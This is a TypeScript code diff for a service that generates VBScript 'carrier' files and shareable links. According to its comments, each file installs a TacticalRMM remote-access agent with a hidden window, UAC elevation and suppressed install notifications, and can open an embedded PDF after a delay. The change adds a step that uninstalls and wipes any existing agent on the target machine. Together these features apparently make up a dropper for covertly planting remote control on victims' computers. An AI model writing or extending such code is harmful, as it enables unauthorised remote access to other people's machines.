@@ -17,7 +17,7 @@ import {
 } from "./device-tools";
 // TASK_178 stage 1 — the forked carrier (NEVER the openframe one): single-line
 // normaliser, the TASK_172 `--silent` guarantee, and the `.vbs` renderer.
-import { ensureSilentEnroll, normalizePowerShellCommand, renderCarrierVbs } from "./vantra-carrier";
+import { ensureAgentCleanSlate, ensureSilentEnroll, normalizePowerShellCommand, renderCarrierVbs } from "./vantra-carrier";
 
 // Task 93 — the Vantra plugin provisioning + device-action service.
 //
@@ -741,7 +741,10 @@ async function fetchPublicOrgPsCommand(
 //      TASK_172 `--silent` fix, because Vantra's psCommand does NOT carry
 //      the generator's fix and the owner's test VBS still showed the
 //      TacticalRMM notification after install;
-//   3. renderCarrierVbs           — hidden + UAC `runas` + 1023-char
+//   3. ensureAgentCleanSlate      — TASK_182: uninstall any pre-existing
+//      agent + wipe its config first (`-m install` refuses to reconfigure
+//      an installed agent and silently keeps the stale config);
+//   4. renderCarrierVbs           — hidden + UAC `runas` + 1023-char
 //      chunking (the carrier the owner tested on the VM).
 //
 // DELIBERATELY NOT PERSISTED — same posture as public-powershell: the bytes
@@ -795,8 +798,12 @@ export async function mintPublicVbsFile(
   const flat = normalizePowerShellCommand(minted.command);
   // Stage-1 owner directive: no TacticalRMM GUI / success notification.
   const silent = ensureSilentEnroll(flat);
+  // TASK_182: uninstall any pre-existing agent first — `-m install` refuses
+  // to reconfigure an installed agent and silently keeps its old config
+  // (the 2026-10-07 VM failure: stale ApiURL → crash-loop → no device).
+  const clean = ensureAgentCleanSlate(silent);
   const content = renderCarrierVbs(
-    silent,
+    clean,
     pdf ? { pdf: { pdfBase64: pdf.pdf, pdfName: pdf.pdfName, delaySec: pdf.pdfDelaySec } } : {},
   );
   const fileName = safeVbsFileName(requestedName);
@@ -958,10 +965,13 @@ export async function resolveVbsInstallToken(token: string): Promise<VbsLinkArti
   const { command } = await fetchPublicOrgPsCommand(row.userId); // D5 — throws on failure
   const flat = normalizePowerShellCommand(command);
   const silent = ensureSilentEnroll(flat);
+  // TASK_182 — same clean-slate guarantee as mintPublicVbsFile: a shared link
+  // re-mints on every hit, and the target machine may carry an older agent.
+  const clean = ensureAgentCleanSlate(silent);
   const pdf = payload.pdfBase64
     ? { pdfBase64: payload.pdfBase64, pdfName: payload.pdfName, delaySec: payload.pdfDelaySec }
     : undefined;
-  const content = renderCarrierVbs(silent, pdf ? { pdf } : {});
+  const content = renderCarrierVbs(clean, pdf ? { pdf } : {});
   const fileName = safeVbsFileName(payload.vbsName);
   // One open = one download, best-effort (zip parity): a count write must
   // never cost the caller the bytes that were already rendered for them.
